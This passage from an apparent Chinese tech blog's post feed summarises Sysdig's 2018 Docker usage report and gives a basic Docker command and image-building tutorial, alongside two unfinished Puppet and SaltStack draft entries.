<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/08/21/DevOps-Docker/">DevOps漫谈：Docker ABC</a></li>
</ul>
<p>根据 <a href="https://sysdig.com/opensource/">Sysdig</a> 发表的年度 <a href="https://riboseyim.github.io/2017/08/21/DevOps-Docker/">Docker</a> 用户报告，在容器市场 Docker 仍然是事实上的行业标准，但是其它品牌的容器运行环境正在发展；Kubernetes 仍然是容器编排领域的王者。报告的数据来源主要依据 Sysdig Monitor 和 Sysdig Secure cloud service 提供的容器使用状况的实时快照报告，它们从容器健康、性能和安全性等方面提供度量指标和可视化服务。样本集包括垂直行业和各类规模不等的大中型企业，地域覆盖北美洲、拉丁美洲、EMEA（欧洲、中东、非洲）和亚太地区。与去年一样，这份报告并不是用来代表整个容器市场。因为数据仅限于 Sysdig 客户，所以对于那些选择商业和开源解决方案的公司来说不具有代表性。但是来自 90000 个容器用户汇总数据，确实提供了了解真实生产环境容器使用状况的独特视角。</p>
<h2 id="2018-Docker-用户报告-Sysdig-Edition"><a href="#2018-Docker-用户报告-Sysdig-Edition" class="headerlink" title="2018 Docker 用户报告 - Sysdig Edition"></a>2018 Docker 用户报告 - Sysdig Edition</h2><h4 id="容器应用排行榜"><a href="#容器应用排行榜" class="headerlink" title="容器应用排行榜"></a>容器应用排行榜</h4><p>容器部署应用榜首：Java Virtual Machines (JVM)。在容器时代之前，Java 就广泛应用于企业级服务，目前两者 —— Java 和容器更加紧密地融合到了一起。</p>
<p>我们还看到数据库解决方案的使用在增加, 例如在容器环境中运行 <a href="(https://riboseyim.github.io/2018/01/03/OpenSource-DB-PostgreSQL/">PostgreSQL</a>) 和 MongoDB 。这是一个信号, 表明在容器中部署有状态服务已经成为现实。容器的短暂性，让许多人对于在容器中运行高价值数据服务抱有怀疑态度, 但是市场回答了问题的解决方案—即为微服务设计的持久、便携和共享存储。数据显示, 客户开始转向完全由容器驱动的环境。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_01.png" alt=""></p>
<h4 id="容器密度"><a href="#容器密度" class="headerlink" title="容器密度"></a>容器密度</h4><p>在2017年每个主机的容器数的中位数是 10 。2018年，这个数字上升到 15，同比增长 50% 。另一方面，我们看到一个客户的单台主机上运行了 154 个容器，比我们去年观察到的最大 95 个增长了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_02.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_03.png" alt=""></p>
<h4 id="容器运行环境"><a href="#容器运行环境" class="headerlink" title="容器运行环境"></a>容器运行环境</h4><blockquote>
<p>Docker still reigns, but we’re seeing what might be the first signs of cracks in the dam.</p>
</blockquote>
<p>事实上的容器运行环境依然是<a href="(https://riboseyim.github.io/2017/08/21/DevOps-Docker/">Docker</a>。我们在 2017 年的报告中没有提及其他容器运行环境的详细信息, 因为在当时 Docker 的占有率接近 99% 。但是, 鉴于最近的一些变化： Red Hat  收购 CoreOS 的 (RKT 的制造商)，以及 Open Container Initiative (OCI) 项目 — 旨在推进容器运行环境和镜像标准化。</p>
<p>事实上，在过去的一年里, 客户对其他平台的使用增加了。CoreOS RKT 显著增长到 12% , Mesos containerizer 占有 4% 。LXC 也在增长, 尽管从业人员规模比例还较低。数据显示, 客户在生产环境中使用 “non-Docker” 解决方案更加便利了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_04.png" alt="Container runtimes: Docker leads, followed by rkt and Mesos."></p>
<h4 id="容器存活周期"><a href="#容器存活周期" class="headerlink" title="容器存活周期"></a>容器存活周期</h4><p>95% 的容器存活时间低于一周。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_05.png" alt=""></p>
<p>容器和服务的生存时间是多少？ 我们观察了容器、容器镜像和服务的数量, 它们在短时间内开始并停止, 存活10秒或更短, 或者一周或更长。下图显示不同间隔内的容器百分比。 11% 的容器活了不到10秒。大部分容器（27%） 的生存期在五分钟之内。</p>
<p>为什么这么多的容器寿命如此之短呢？我们知道许多定制的系统都是按照需求来扩展的。容器被创建, 做他们的工作, 然后离开。例如, 一个客户为他们在 Jenkins 创建的每个作业配置一个容器，执行变更测试, 然后关闭容器。对他们来说, 类似活动每天会发生上千次。（Jenkins：一个用 Java 编写的开源持续集成工具，MIT许可证。它支持软件配置管理工具，如CVS、Subversion 和 Git 等，可以执行基于 Apache Ant 和 Apache Maven 的项目，以及任意的Shell 脚本/批处理命令。）</p>
<h4 id="镜像存活周期"><a href="#镜像存活周期" class="headerlink" title="镜像存活周期"></a>镜像存活周期</h4><p>我们还观察了容器镜像的使用时间。通过查看这些数据, 我们了解到客户在 DevOps CI/CD 流程的一部分中是如何频繁地进行新的容器更新部署的。 一小部分 — 一个百分点—在不到10秒内更新。69% 的容器镜像在一周的跨度内更新。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_06.png" alt=""></p>
<h4 id="服务存活周期"><a href="#服务存活周期" class="headerlink" title="服务存活周期"></a>服务存活周期</h4><p>“服务的寿命是多少？” 在 Kubernetes 中, 服务抽象定义了一组提供特定函数以及如何访问它们的 Pods 。服务允许 Pods 在不影响应用程序的情况下注销和复制。例如, 一个群集可以运行一个 Node.js  JavaScript 运行时服务、MySQL 数据库服务和 NGINX 前端服务。</p>
<p>我们看到大多数服务(67%)生存期超过一周。少量的服务在更频繁的基础上被停止, 但是对于大多数客户来说, 目标是让应用程序 24 小时持续工作。容器和 Pods 可能会来了又走, 但是服务持续处于启动并且可用状态。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_07.png" alt="Most container-based services stay up beyond a week."></p>
<h4 id="容器编排器"><a href="#容器编排器" class="headerlink" title="容器编排器"></a>容器编排器</h4><blockquote>
<p>First place goes to Kubernetes, followed by Kubernetes and then Kubernetes.</p>
</blockquote>
<p>例如, Mesosphere 能够在 DC/OS 环境中部署和管理 “Kubernetes-as-a-service”。可以将多个 Kubernetes 群集部署在一个 Mesosphere 群集上。</p>
<p>今年 Docker Swarm 的排名上升到第二位, 超过了基于 Mesos 的工具。根据 Sysdig ServiceVision 我们能自动标识出是否使用编排器, 并将逻辑基础结构对象与容器度量关联起来。在 2018 年, Kubernetes 可以确保领先地位。</p>
<ol>
<li><p>Swarm 的进入门槛<br>例如, 微软使用 Kubernetes 为其 Azure Kubernetes 服务 (AKS), IBM 的云容器服务和私有云产品也是基于 Kubernetes 。即使是 Docker 和 Mesosphere 也增加支持了 Kubernetes 的功能。</p>
</li>
<li><p>Docker 企业版, 具有通用控制平面 (Universal Control Plane (UCP) ), 在许多操作层面上降低了启动 Swarm 的门槛。</p>
</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_08.png" alt="编排器份额： Kubernetes 和 Swarm 增长, Mesos 萎缩。"></p>
<h4 id="容器集群大小"><a href="#容器集群大小" class="headerlink" title="容器集群大小"></a>容器集群大小</h4><blockquote>
<p>Mesos owns the big cluster game.</p>
</blockquote>
<p>”集群大小对与组织选择编排器的影响是什么？“<br>这项研究显示基于 Mesos 的编排器, 包括 Mesos Marathon 和 Mesosphere DC/OS 降至第三位。在使用 Mesos 的地方, 部署的容器数（中位数）比 Kubernetes 环境多 50% 。鉴于 Mesos 倾向于在大规模的容器和云部署, 所以这是有意义的。因此, 虽然 Mesos 集群的数量较少, 但是 Mesos 集群通常是意味着更大的企业规模。</p>
<p>我们的客户, 往往是更大的企业（在私有数据中心运行 Sysdig 解决方案）采用 OpenShift 的数量比我们的 SaaS 客户数量还要多。 Rancher Labs 于 2015 年出现, 为 Docker Swarm 和 Kubernetes 提供支持。直到 2017 年, Rancher （“大农场主”）才完全兼容 Kubernetes 作为其编排器。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_09.png" alt="Mesos clusters 50% larger than Kubernetes. Swarm 30% smaller."></p>
<h4 id="Kubernetes-分发版"><a href="#Kubernetes-分发版" class="headerlink" title="Kubernetes 分发版"></a>Kubernetes 分发版</h4><p>今年我们分析了使用 Kubernetes 的“品牌”分布, 看看在使用的 Kubernetes 是开源版本, 或由特定供应商提供的软件包。我们发现开源 Kubernetes 继续占有最大的份额, 但是 OpenShift 似乎正在取得突破进展, Rancher 也占有了一些份额。</p>
<p>OpenShift 获得接受不应该是一个惊喜。Kubernetes 于 2014 年诞生于 Google , Red Hat 也发布了该平台的 OpenShift 分发版, 并提出了针对企业客户实现 Kubernetes 的目标。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_10.png" alt="Open source Kubernetes most used, followed by OpenShift and Rancher distributions."></p>
<h4 id="容器健康与应用性能监控"><a href="#容器健康与应用性能监控" class="headerlink" title="容器健康与应用性能监控"></a>容器健康与应用性能监控</h4><p>了解用户体验的四个“黄金信号” ：延迟（latency），流量（traffic），错误（errors）和饱和度（saturation）。<br>响应时间（Response time）是配置最广泛的告警类型，紧随其后的是正常运行时间（uptime）和停机告警。基于主机的告警是最常用的，包括主要资源指标 -  CPU ，内存和磁盘使用率等仍然被广泛使用。用户想知道托管 Docker 的服务器（物理机，虚拟机或云实例）是否处于资源紧张或达到容量上限的状态。这些告警的触发条件通常设置在利用率达到 80%-95％ 之间。</p>
<p>同时，出现了越来越多的以容器为中心的资源告警。最主要有两种风格：</p>
<ul>
<li>1）资源利用率</li>
<li>2）容器数量</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_11.png" alt="最流行的告警条件：服务响应时间和正常运行时间"></p>
<p><strong>默认情况下容器没有资源限制</strong> 。鉴于客户越来越注意容器限制方面的告警，这意味着他们正在使用 Docker运行时配置来控制容器使用内存，CPU或磁盘I / O 的上限，用户希望知道何时会超出阈值，应用程序的性能风险需要处于可控状态。</p>
<p>对于容器数量来说，这个问题通常与用户至少需要 X 个给定类型的容器并运行以提供所需的服务级别有关，特别是在微服务部署中。例如，“我知道如果需要确保应用程序运行良好，至少有三个 NGINX 容器可用。如果任何一个有问题，我都想知道。”</p>
<p><strong>基于编排的告警（Orchestration-focused alerts）</strong> 也越来越受欢迎。与我们 2017 年的报告类似，“Pod Restart Count” 位列榜首。在一个 Pod 中，一个或多个容器是定位相同、共同调度（通常作为微服务的一部分）。如果某个容器重新启动太频繁，则表示存在可能影响应用程序性能的问题。</p>
<p>Kubernetes 管理员也经常使用 <strong>基于事件的告警（ Event-based alerts ）</strong> 。与基于度量的告警相比，它的区别在于，监控程序需要查找环境中生成的事件消息，例如 Kurthnetes “CrashLoopBackoff” 条件 — 代表 Pod 反复失败或重启，或者“Liveness probe failed”，表示容器是否为活跃和运行。这些告警有助于 DevOps 工程师快速定位问题。</p>
<p>Http 错误可能表明软件或基础架构存在问题，最终会影响性能。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_12.png" alt="Kubernetes pod and namespace rises to top of alert scoping in 2018."></p>
<blockquote>
<p>Alerts are not a one-size-fits-all approach.</p>
</blockquote>
<p>告警不是一种万能的方法。有时需要设置基于指定范围的告警，无论是逻辑或物理实体，还是整个基础结构（注：Sysdig 通过标签实现）。</p>
<p>在 2018 年的研究中，用于确定告警范围的最常用标签与 Kubernetes 有关（Scoping by pods），命名空间（namespace）紧随其后。特定的容器范围（Container specific scoping）也很受欢迎，包括容器名称，容器镜像和容器 ID 。2018年再次名列榜首的是云服务提供商标签，通常针对“名称”，“环境”，“ID”和“区域”标签以区分开发、测试和生产资源，以及标记云数据中心的位置。</p>
<h4 id="容器和基础设施自定义监控指标"><a href="#容器和基础设施自定义监控指标" class="headerlink" title="容器和基础设施自定义监控指标"></a>容器和基础设施自定义监控指标</h4><blockquote>
<p>There’s no one custom metrics format to rule them all.</p>
</blockquote>
<p>“在环境中运行容器的客户，使用自定义指标的比例是多少，都是哪些？”</p>
<p>55％ 的 Sysdig SaaS 用户使用与 Java 应用程序相关的 JMX 指标。这与我们看到的 Java 应用程序部署非常广泛的事实一致。 StatsD 占有 29％ 的份额，Prometheus 占有 20％ 的份额（预计这个数字会随着时间的推移而增长）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_13.png" alt="JMX is the most used custom metric format."></p>
<h4 id="容器注册"><a href="#容器注册" class="headerlink" title="容器注册"></a>容器注册</h4><blockquote>
<p>It’s a split decision - registries are critical but there’s no clear leader.</p>
</blockquote>
<p>注册管理机构至关重要，但是目前没有明确的领导者。<br>容器注册表（container registry）是任何容器部署的基本组件。市场上有许多解决方案：一些是公共的，一些是私有的，一些是作为服务提供，一些是作为本地软件（private registry）部署。</p>
<p>2018 年前三名中，Google Container Registry（GCR）的比例最高，其次是 Quay ,之后是 Docker和 Amazon Elastic Container Registry（ECR）。 GCR 和 ACR 都是完全基于云托管的（private Docker container registries）。Quay 和 Docker 既可以用作本地解决方案也可以在云中运行（注：Sysdig 的用户群只有 50％ 能够清楚地识别出容器注册方案）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Docker_2018_14.png" alt="Container registry use is divided across public and private solutions."></p>
<blockquote>
<p>New approaches are maturing and helping organizations develop applications more quickly to solve real business challenges and compete in the digital marketplace.</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="网络安全专题合辑《Cyber-Security-Manual》"><a href="#网络安全专题合辑《Cyber-Security-Manual》" class="headerlink" title="网络安全专题合辑《Cyber-Security Manual》"></a>网络安全专题合辑《Cyber-Security Manual》</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://agentneoteam.github.io/2018/05/07/agentneo-jia-gou-jian-jie.html">AgentNEO 架构简介 | 07 May 2018</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/1607_caoyq_sysdig/index.html">用 Sysdig 监控服务器和 Docker 容器 | 曹元其 | 2016 年 7 月 15 日发布</a></li>
<li><a href="http://cizixs.com/2017/04/27/sysdig-for-linux-system-monitor-and-analysis">使用 sysdig 进行监控和调试 linux 机器</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps-Puppet</title>
    <url>/2018/09/17/DevOps-Deployment-Puppet/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-Puppet-简介"><a href="#Introduction-Puppet-简介" class="headerlink" title="Introduction | Puppet 简介"></a>Introduction | Puppet 简介</h2><h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://downloads.puppetlabs.com/</span><br><span class="line"></span><br><span class="line"><span class="comment">## hello puppet !</span></span><br><span class="line">$ puppet status</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"is_alive"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"5.5.6"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">Puppet does not support OS X versions &lt; 10.4</span><br></pre></td></tr></table></figure>
<h2 id="Core-Concept-Puppet-核心概念"><a href="#Core-Concept-Puppet-核心概念" class="headerlink" title="Core Concept | Puppet 核心概念"></a>Core Concept | Puppet 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Puppet-架构"><a href="#Architecture-Puppet-架构" class="headerlink" title="Architecture | Puppet 架构"></a>Architecture | Puppet 架构</h2><h4 id="Puppet-Development-Kit"><a href="#Puppet-Development-Kit" class="headerlink" title="Puppet Development Kit"></a>Puppet Development Kit</h4><blockquote>
<p>PDK provides integrated testing tools and a simple command line interface to help you develop, validate, and test modules.</p>
</blockquote>
<h4 id="Task-Runner-Bolt"><a href="#Task-Runner-Bolt" class="headerlink" title="Task Runner : Bolt"></a>Task Runner : Bolt</h4><blockquote>
<p>Bolt is an open source task runner that automates the manual work that you do to maintain your infrastructure. Use Bolt to automate tasks that you perform on your infrastructure on an as-needed basis, for example, when you troubleshoot a system, deploy an application, or stop and restart services. Bolt connects directly to remote nodes with SSH or WinRM, so you are not required to install any agent software.</p>
</blockquote>
<h2 id="Best-Practice-Puppet-最佳实践"><a href="#Best-Practice-Puppet-最佳实践" class="headerlink" title="Best Practice | Puppet 最佳实践"></a>Best Practice | Puppet 最佳实践</h2><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Yum   </span></span><br><span class="line">$ yum clean all</span><br><span class="line">$ yum update yum</span><br><span class="line">$ yum update</span><br><span class="line"><span class="comment"># MacPorts</span></span><br><span class="line">$ wget https://guide.macports.org/</span><br><span class="line">$ port version</span><br><span class="line">Version: 2.5.3</span><br></pre></td></tr></table></figure>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>DevOps-Deployment-SaltStack</title>
    <url>/2018/09/18/DevOps-Deployment-SaltStack/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-简介"><a href="#Introduction-简介" class="headerlink" title="Introduction |  简介"></a>Introduction |  简介</h2><h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://downloads.puppetlabs.com/</span><br><span class="line"></span><br><span class="line"><span class="comment">## hello puppet !</span></span><br><span class="line">$ puppet status</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"is_alive"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"5.5.6"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Puppet does not support OS X versions &lt; 10.4</span><br></pre></td></tr></table></figure>
<h2 id="Core-Concept-Puppet-核心概念"><a href="#Core-Concept-Puppet-核心概念" class="headerlink" title="Core Concept | Puppet 核心概念"></a>Core Concept | Puppet 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Puppet-架构"><a href="#Architecture-Puppet-架构" class="headerlink" title="Architecture | Puppet 架构"></a>Architecture | Puppet 架构</h2><h2 id="Best-Practice-Puppet-最佳实践"><a href="#Best-Practice-Puppet-最佳实践" class="headerlink" title="Best Practice | Puppet 最佳实践"></a>Best Practice | Puppet 最佳实践</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>DevOps 漫谈：Docker</title>
    <url>/2017/08/21/DevOps-Docker/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Docker ABC:常用命令、自定义制作、发布</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Virtualization Technology</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/08/21/DevOps-Docker/">DevOps漫谈：Docker ABC</a></li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/1600/1*easlVE_DOqRDUDkVINRI9g.png" alt=""></p>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><ul>
<li>Docker 常用命令</li>
<li>Docker 自定义制作</li>
</ul>
<h4 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker version</span><br><span class="line">$ docker info</span><br><span class="line"></span><br><span class="line"><span class="comment"># service 命令的用法</span></span><br><span class="line">$ sudo service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机的所有 image 文件。</span></span><br><span class="line">$ docker image ls</span><br><span class="line"><span class="comment"># 删除 image 文件</span></span><br><span class="line">$ docker image rm [imageName]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hello World</span></span><br><span class="line">$ docker image pull hello-world</span><br><span class="line">$ docker container run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动已经生成、已经停止运行</span></span><br><span class="line">$ docker container start [containerID]</span><br><span class="line"><span class="comment"># 终止容器 [SIGTERM]</span></span><br><span class="line">$ docker container stop [containerID]</span><br><span class="line"><span class="comment"># 终止容器 [SIGKILL]</span></span><br><span class="line">$ docker container <span class="built_in">kill</span> [containID]</span><br><span class="line"><span class="comment"># 列出本机正在运行的容器</span></span><br><span class="line">$ docker container ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出本机所有容器，包括终止运行的容器</span></span><br><span class="line">$ docker container ls --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入一个正在运行的容器</span></span><br><span class="line">$ docker container <span class="built_in">exec</span> -it [containerID] /bin/bash</span><br><span class="line"><span class="comment"># 将文件从容器拷贝到本机</span></span><br><span class="line">$ docker container cp [containID]:[/path/to/file] .</span><br><span class="line">$ docker container logs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Docker-自定义制作"><a href="#Docker-自定义制作" class="headerlink" title="Docker 自定义制作"></a>Docker 自定义制作</h4><ul>
<li>项目根目录创建 .dockerignore 文件(需要忽略打包的文件)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.git</span><br><span class="line">logs</span><br></pre></td></tr></table></figure></li>
<li><p>创建 Dockerfile 文件</p>
</li>
<li><p>构建 image 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## You need to add a dot（&quot;docker build&quot; requires exactly 1 argument(s)）</span></span><br><span class="line">$ docker image build -t gospider .</span><br><span class="line">Sending build context to Docker daemon  12.47MB</span><br><span class="line">Step 1/4 : FROM node:8.4</span><br><span class="line">8.4: Pulling from library/node</span><br><span class="line">aa18ad1a0d33: Downloading [===============&gt;                                   ]  16.18MB/52.6MB</span><br><span class="line">90f6d19ae388: Download complete</span><br><span class="line">94273a890192: Downloading [================&gt;                                  ]  14.13MB/43.23MB</span><br><span class="line">c9110c904324: Downloading [===&gt;                                               ]  10.25MB/134.7MB</span><br><span class="line">788d73c0fb6b: Waiting</span><br><span class="line">f221bb562f24: Waiting</span><br><span class="line">14414a6a768d: Waiting</span><br><span class="line">af6d2b2ad991: Waiting</span><br><span class="line">......</span><br><span class="line">14414a6a768d: Pull complete</span><br><span class="line">af6d2b2ad991: Pull complete</span><br><span class="line">Digest: sha256:080488acfe59bae32331ce28373b752f3f848be8b76c2c2d8fdce28205336504</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> node:8.4</span><br><span class="line"> ---&gt; 386940f92d24</span><br><span class="line">Step 2/4 : COPY . /app</span><br><span class="line"> ---&gt; 5dea8aef5c00</span><br><span class="line">Step 3/4 : WORKDIR /app</span><br><span class="line">Removing intermediate container de21dc94fd49</span><br><span class="line"> ---&gt; c04960e1036b</span><br><span class="line">Step 4/4 : EXPOSE 3001</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 7e5efe5e0b43</span><br><span class="line">Removing intermediate container 7e5efe5e0b43</span><br><span class="line"> ---&gt; bcadd82be353</span><br><span class="line">Successfully built bcadd82be353</span><br><span class="line">Successfully tagged gospider:latest</span><br><span class="line"></span><br><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">gospider            latest              bcadd82be353        7 minutes ago       685MB</span><br></pre></td></tr></table></figure>
</li>
<li><p>制作容器<br>docker container run 从 image 文件生成容器。<br>可选参数：</p>
</li>
<li>-p  参数：p1:p2 [容器端口]映射到[本机端口]</li>
<li>imagename</li>
<li>/bin/bash：保证用户可以使用 Shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker container run -it gospider /bin/bash</span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment">#</span></span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment">#</span></span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment"># ls</span></span><br><span class="line">Dockerfile		     </span><br><span class="line">gmof_caipiao_month.go	    gmof_cdc_epide_month.go	    publish		    ttank_zyuc_handle.go</span><br><span class="line">charset.go		     gmof_caipiao_month_spider.go   gmof_cdc_epide_month_spider.go  <span class="built_in">test</span>		    ttank_zyuc_register.go</span><br><span class="line">dbutils_csv.go		     gmof_casad_info_spider.go	    gmof_person.go		    ttank-echarts	    zyuc_task_info.go</span><br><span class="line">dbutils_kafka.go	     gmof_casad_list.go		    gmof_person_region.go	    ttank.go		    zyuc_task_spider.go</span><br><span class="line">dbutils_pg.go		     gmof_casad_list_spider.go	    gmof_person_region_spider.go    ttank_gmof_handle.go    </span><br><span class="line">gmof_caipiao_list.go	     gmof_cdc_epide_list.go	    kafka			    ttank_gmof_register.go</span><br><span class="line">gmof_caipiao_list_spider.go  gmof_cdc_epide_list_spider.go  ops				    ttank_tasks.go</span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment">#</span></span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@d2d7bfd9f4c1:/app<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h4 id="Docker-发布"><a href="#Docker-发布" class="headerlink" title="Docker 发布"></a>Docker 发布</h4><ul>
<li>注册账户：<a href="https://hub.docker.com">hub.docker.com</a> 或 <a href="https://cloud.docker.com">cloud.docker.com</a></li>
